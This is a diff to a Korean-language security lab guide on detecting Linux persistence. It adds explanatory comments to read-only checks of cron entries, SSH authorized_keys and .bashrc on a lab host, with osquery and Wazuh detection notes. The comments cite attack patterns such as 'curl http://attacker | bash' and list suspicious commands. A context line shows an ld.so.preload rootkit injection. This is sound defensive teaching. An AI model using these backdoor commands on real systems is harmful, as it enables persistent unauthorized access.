@@ -118,21 +118,45 @@ echo "/tmp/rootkit.so" >> /etc/ld.so.preload
 
 ### 1 — cron 시뮬 (실 적용 X)
 
-```
+```bash
+# /etc/crontab — 시스템 표준 cron table (root 권한)
+#   각 row: <분> <시> <일> <월> <요일> <user> <command>
+# /etc/cron.d/ — 개별 cron job 파일 (각 파일이 cron entry)
+# 학습 점:
+#   - 정상 환경: 시스템 표준 entry 만 (apt update / logrotate / 등)
+#   - 침해 환경: 의심 entry (예: curl http://attacker | bash)
 ssh 6v6-bastion 'cat /etc/crontab; echo "---"; ls /etc/cron.d/'
+# 운영 측 detection: osquery 의 crontab 테이블 + Wazuh syscheck (FIM)
 ```
 
 ### 2 — authorized_keys 검사
 
-```
-ssh 6v6-bastion 'sudo cat /root/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null'
+```bash
+# SSH authorized_keys — passwordless SSH login 허용 key list
+#   각 row: <key type> <public key base64> <comment>
+#   침해 시 attacker 가 자기 key 추가 → 비밀번호 없이 재진입
+ssh 6v6-bastion '
+sudo cat /root/.ssh/authorized_keys 2>/dev/null   # root user 의 keys
+cat ~/.ssh/authorized_keys 2>/dev/null            # 현재 user 의 keys
+'
+# 정상: 학습 환경 keys 만 (admin / 강사 key)
+# 의심: 알 수 없는 comment + 외부 IP / 비정상 timestamp
+# 운영 측 detection:
+#   - osquery authorized_keys 테이블 (모든 user 의 keys 조회)
+#   - Wazuh FIM realtime=yes 로 ~/.ssh/ 감시
 ```
 
 ### 3 — .bashrc backdoor 시뮬
 
-```
+```bash
+# .bashrc — 사용자 shell 시작 시 실행되는 script
+#   침해 패턴: 끝에 'curl http://attacker | bash &' 추가
+#   사용자가 SSH 진입 시마다 backdoor 실행
+# 본 실습: 검사만, 실 변경 X
 ssh 6v6-bastion 'tail -5 ~/.bashrc'
-# 실 변경 X — 검사만
+# 정상: alias / PS1 / source / export 등 표준 entry
+# 의심: curl / wget / nc / bash -i / eval $(...) 등 의심 명령
+# 운영 측 detection: Wazuh FIM 의 ~/.bashrc 변경 alert
 ```
 
 ### 4 — osquery 로 detection
